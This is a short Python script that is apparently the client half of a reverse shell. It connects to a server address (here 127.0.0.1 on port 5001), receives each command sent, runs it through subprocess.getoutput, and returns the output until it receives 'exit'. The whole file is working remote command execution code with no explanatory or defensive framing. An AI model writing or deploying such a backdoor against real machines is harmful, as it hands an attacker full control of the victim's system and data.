import socket
import subprocess
#server ip
serv_ip = "127.0.0.1"
#server port
serv_port = 5001
buffer = 1024
#socket object
s = socket.socket()
#connect to server
s.connect((serv_ip,serv_port))
#message = s.recv(buffer).decode()
#print(message)
while True:
   command = s.recv(buffer).decode()
   if command == "exit":
      break
   result = subprocess.getoutput(command)
   #send the output
   s.send(result.encode())
#close the connection   
s.close()   
